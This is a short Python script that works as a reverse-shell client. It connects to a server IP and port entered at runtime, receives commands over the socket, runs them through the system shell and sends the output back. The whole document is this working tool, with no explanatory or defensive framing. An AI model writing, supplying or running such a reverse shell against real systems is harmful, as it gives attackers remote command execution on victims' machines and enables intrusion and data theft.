import subprocess
import os
import socket

#server_ip = "192.168.0.241"
#server_port = 5555

server_ip = input("Please enter the Server-IP: ")
server_port = int(input("Please enter the Server-Port: "))

if server_port > 0 and server_port <= 65535:
	s = socket.socket()
	s.connect((server_ip, server_port))

	while True:
		command = s.recv(8192).decode("utf-8")
		if command.startswith("cd "):
			os.chdir(command[3:])
			s.send(b"Shell-after-cd> ")
			continue
		if len(command) > 0:
			proc = subprocess.run(command, shell=True, capture_output=True)
			data = proc.stdout + proc.stderr
			s.send(data + b"Shell--> ")
		else:
			break
	s.close()
else:
	print("The Server-Port is out of range (0-65535)!")

